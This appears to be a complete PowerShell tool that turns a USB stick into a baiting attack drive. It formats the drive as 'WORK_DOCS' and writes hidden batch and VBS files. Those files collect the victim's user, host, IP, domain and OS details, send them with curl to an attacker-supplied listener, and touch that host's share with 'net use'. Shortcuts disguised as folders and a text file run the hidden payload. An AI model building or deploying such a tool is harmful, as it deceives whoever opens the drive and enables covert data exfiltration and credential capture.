param (
    [string]$listenerIP
)

function Show-Help {
    Write-Host "`nUSB Drop Builder Tool"
    Write-Host "Usage: .\usb_drop_builder.ps1 <listener-ip-address>"
    Write-Host "Example: .\usb_drop_builder.ps1 1.2.3.4"
    exit 0
}

if (-not $listenerIP -or $listenerIP -in @('-h', '--help')) {
    Show-Help
}

$removableDisks = Get-PhysicalDisk | Where-Object { $_.BusType -eq 'USB' }
$driveList = @()
foreach ($disk in $removableDisks) {
    $diskNumber = $disk.FriendlyName
    $partitions = Get-Disk | Where-Object { $_.FriendlyName -eq $diskNumber } | Get-Partition
    foreach ($part in $partitions) {
        $vol = Get-Volume -DriveLetter $part.DriveLetter -ErrorAction SilentlyContinue
        if ($vol) {
            $driveList += $vol
        }
    }
}

if ($driveList.Count -eq 0) {
    Write-Host "`n[-] No mounted USB volumes found." -ForegroundColor Yellow
    exit 1
}

Write-Host "`nSelect a USB drive to format and prepare:`n"
for ($i = 0; $i -lt $driveList.Count; $i++) {
    $v = $driveList[$i]
    Write-Host "[$i] $($v.DriveLetter): $($v.FileSystemLabel) ($([math]::Round($v.SizeRemaining/1GB,2)) GB free)"
}

$choice = Read-Host "`nEnter number of drive to use"
if ($choice -notmatch '^[0-9]+$' -or [int]$choice -ge $driveList.Count) {
    Write-Host "`n[-] Invalid selection. Aborting." -ForegroundColor Yellow
    exit 1
}

$selectedDrive = $driveList[$choice]
$driveLetter = $selectedDrive.DriveLetter
$drive = "${driveLetter}:\"
Format-Volume -DriveLetter $driveLetter -FileSystem FAT32 -NewFileSystemLabel "WORK_DOCS" -Force -Confirm:$false

$dropPath = $drive
$originalLocation = Get-Location
Set-Location $dropPath

$batTemplate = @()
$batTemplate += '@echo off'
$batTemplate += 'set TEMPFILE=%TEMP%\sysinfo.txt'
$batTemplate += 'echo === SYSTEM INFO DUMP === > %TEMPFILE%'
$batTemplate += 'echo [WHOAMI] >> %TEMPFILE%'
$batTemplate += 'whoami >> %TEMPFILE%'
$batTemplate += 'echo. >> %TEMPFILE%'
$batTemplate += 'echo [HOSTNAME] >> %TEMPFILE%'
$batTemplate += 'hostname >> %TEMPFILE%'
$batTemplate += 'echo. >> %TEMPFILE%'
$batTemplate += 'echo [INTERNAL_IP] >> %TEMPFILE%'
$batTemplate += 'ipconfig | findstr /i "IPv4" >> %TEMPFILE%'
$batTemplate += 'echo. >> %TEMPFILE%'
$batTemplate += 'echo [DOMAIN] >> %TEMPFILE%'
$batTemplate += 'echo %USERDOMAIN% >> %TEMPFILE%'
$batTemplate += 'echo. >> %TEMPFILE%'
$batTemplate += 'echo [OS INFO] >> %TEMPFILE%'
$batTemplate += 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Registered Owner" /C:"Registered Organization" >> %TEMPFILE%'
$batTemplate += 'echo. >> %TEMPFILE%'
$batTemplate += 'curl -X POST -F "data=@%TEMPFILE%" http://' + $listenerIP + ':8080'
$batTemplate += 'net use \\' + $listenerIP + '\share >nul 2>&1'
$batTemplate += 'timeout /t 5 >nul'
$batTemplate += 'del %TEMPFILE%'

$batPath = Join-Path $dropPath "_index.bat"
$batTemplate | Set-Content -Encoding ASCII -Path $batPath
attrib +h $batPath

$vbsContent = @'
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "_index.bat" & chr(34), 0
Set WshShell = Nothing
'@
$vbsPath = Join-Path $dropPath "_index.vbs"
$vbsContent | Set-Content -Path $vbsPath -Encoding ASCII
attrib +h $vbsPath

function New-FakeLink {
    param (
        [string]$name,
        [string]$iconIndex
    )
    $shortcut = "$dropPath\$name.lnk"
    $WScriptShell = New-Object -ComObject WScript.Shell
    $lnk = $WScriptShell.CreateShortcut($shortcut)
    $lnk.TargetPath = "wscript.exe"
    $lnk.Arguments = "_index.vbs"
    $lnk.IconLocation = "C:\\Windows\\System32\\SHELL32.dll,$iconIndex"
    $lnk.WindowStyle = 7
    $lnk.Save()
}

New-FakeLink -name "Client Files" -iconIndex 3
New-FakeLink -name "Corporate" -iconIndex 3
New-FakeLink -name "Personal" -iconIndex 3
New-FakeLink -name "notes.txt" -iconIndex 1

Set-Location $originalLocation
Write-Host "`n[+] USB drop successfully created at $drive"
